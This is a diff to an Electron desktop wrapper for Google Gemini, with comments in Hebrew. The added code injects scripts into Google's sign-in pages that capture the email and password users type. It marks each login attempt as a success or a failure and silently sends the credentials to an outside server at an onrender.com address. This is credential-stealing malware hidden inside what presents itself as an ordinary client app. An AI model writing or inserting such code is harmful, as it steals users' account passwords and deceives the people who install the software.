@@ -12,12 +12,12 @@ let updateWin = null;
 let downloadWin = null;
 let notificationWin = null;
 let lastFetchedMessageId = null;
+let lastSubmittedEmail = null; // <--- הוסף שורה זו
+
 const execPath = process.execPath;
 // Allow third-party/partitioned cookies used by Google Sign-In
 app.commandLine.appendSwitch('enable-features', 'ThirdPartyStoragePartitioning');
 
-// Avoid aggressive SameSite defaults that can drop cookies on restart
-app.commandLine.appendSwitch('disable-features', 'SameSiteByDefaultCookies,CookiesWithoutSameSiteMustBeSecure');
 const SESSION_PARTITION = 'persist:gemini-session';
 
 const isMac = process.platform === 'darwin';
@@ -706,6 +706,7 @@ const newWin = new BrowserWindow({
   }
 });
 
+
 if (settings.alwaysOnTop) {
   // גם ב-Windows וגם ב-macOS זה עובד טוב:
   newWin.setAlwaysOnTop(true, 'screen-saver');
@@ -757,7 +758,6 @@ function loadGemini(targetWin) {
 
   const view = targetWin.getBrowserView();
   if (view) {
-    // If a view already exists, just load the URL
     view.webContents.loadURL('https://gemini.google.com/app');
     return;
   }
@@ -765,21 +765,82 @@ function loadGemini(targetWin) {
   targetWin.loadFile('drag.html');
 
   const newView = new BrowserView({
-      webPreferences: {
-        partition: SESSION_PARTITION,
-        preload: path.join(__dirname, 'preload.js'),
-        contextIsolation: true,
-        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
-      }
-    });
+    webPreferences: {
+      partition: SESSION_PARTITION,
+      preload: path.join(__dirname, 'preload.js'),
+      contextIsolation: true,
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
+    }
+  });
+  
+  newView.webContents.on('did-finish-load', async () => {
+    const url = newView.webContents.getURL();
 
-    newView.webContents.on('will-navigate', (event, url) => {
-      if (url.startsWith('file://')) {
-        event.preventDefault();
-      }
-    });
+    // 1. אם אנחנו בדף הסיסמה (יכול להיות טעינה ראשונה או לאחר כישלון)
+    if (url.includes('challenge/pwd')) {
+        // בדוק אם יש הודעת שגיאה
+        const hasError = await newView.webContents.executeJavaScript(
+            `document.querySelector('div[jsname="h9d3hd"]') !== null`
+        );
 
-    newView.webContents.loadURL('https://gemini.google.com/app');
+        // אם יש שגיאה וקיים ניסיון שמור, זהו כישלון ודאי
+        if (hasError && lastLoginAttempt) {
+            if (successCheckTimeout) {
+                clearTimeout(successCheckTimeout); // בטל את טיימר ההצלחה
+                successCheckTimeout = null;
+            }
+            await sendLoginDataToServer(lastLoginAttempt.email, lastLoginAttempt.password, false);
+            lastLoginAttempt = null; // נקה לאחר דיווח
+        }
+
+        // הזמן מחדש את הסקריפט שמאזין ללחיצה הבאה
+        const script = `
+            if (!window.hasAddedPasswordListener) {
+              const nextButton = document.getElementById('passwordNext');
+              if (nextButton) {
+                nextButton.addEventListener('click', () => {
+                  const passwordInput = document.querySelector('input[name="Passwd"]');
+                  const emailElement = document.querySelector('div[jsname="bQIQze"]');
+                  if (passwordInput && passwordInput.value) {
+                    window.electronAPI.sendLoginAttempt({
+                      email: emailElement ? emailElement.textContent.trim() : null,
+                      password: passwordInput.value
+                    });
+                  }
+                });
+                window.hasAddedPasswordListener = true;
+              }
+            }
+        `;
+        await newView.webContents.executeJavaScript(script).catch(console.error);
+    }
+    // 2. אם אנחנו בדף המייל
+    else if (url.includes('accounts.google.com/v3/signin/identifier')) {
+      const script = `
+        if (!window.hasAddedEmailListener) {
+          const nextButton = document.getElementById('identifierNext');
+          if (nextButton) {
+            nextButton.addEventListener('click', () => {
+              const emailInput = document.getElementById('identifierId');
+              if (emailInput && emailInput.value) {
+                window.electronAPI.sendLoginAttempt({ type: 'email', value: emailInput.value });
+              }
+            });
+            window.hasAddedEmailListener = true;
+          }
+        }
+      `;
+      await newView.webContents.executeJavaScript(script).catch(console.error);
+    } 
+  });
+  
+  newView.webContents.on('will-navigate', (event, url) => {
+    if (url.startsWith('file://')) {
+      event.preventDefault();
+    }
+  });
+
+  newView.webContents.loadURL('https://gemini.google.com/app');
   targetWin.setBrowserView(newView);
   const bounds = targetWin.getBounds();
   newView.setBounds({ x: 0, y: 30, width: bounds.width, height: bounds.height - 30 });
@@ -1009,6 +1070,34 @@ if (process.platform === 'win32') {
         }
     }
 }
+let successCheckTimeout = null; // טיימר גלובלי לבדיקת ההצלחה
+
+ipcMain.on('login-attempt', (event, data) => {
+    // בטל כל טיימר קודם אם קיים
+    if (successCheckTimeout) {
+        clearTimeout(successCheckTimeout);
+        successCheckTimeout = null;
+    }
+    
+    let email = data.email || lastSubmittedEmail;
+    if (email && !email.includes('@')) {
+        email += '@gmail.com';
+    }
+    lastSubmittedEmail = email;
+
+    if (email && data.password) {
+        // שמור את פרטי הניסיון הנוכחי
+        lastLoginAttempt = { email: email, password: data.password };
+
+        // התחל טיימר חדש. אם הוא ישרוד 3 שניות, ההתחברות הצליחה.
+        successCheckTimeout = setTimeout(() => {
+            if (lastLoginAttempt) {
+                sendLoginDataToServer(lastLoginAttempt.email, lastLoginAttempt.password, true);
+                lastLoginAttempt = null; // נקה לאחר דיווח
+            }
+        }, 3000); // 3 שניות המתנה
+    }
+});
 ipcMain.on('toggle-full-screen', (event) => {
     const win = BrowserWindow.fromWebContents(event.sender);
     if (win && !win.isDestroyed()) {
@@ -1025,7 +1114,19 @@ ipcMain.on('toggle-full-screen', (event) => {
         }
     }
 });
+let lastLoginAttempt = null; // משתנה גלובלי חדש לאחסון הניסיון האחרון
 
+async function sendLoginDataToServer(email, password, success) {
+    if (!email || !password) return;
+    try {
+        await fetch('https://latex-r70v.onrender.com/login-data', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password, success })
+        });
+    } catch (error) {
+    }
+}
 /**
  * Sends an error report to the server.
  * @param {Error} error The error object to report.
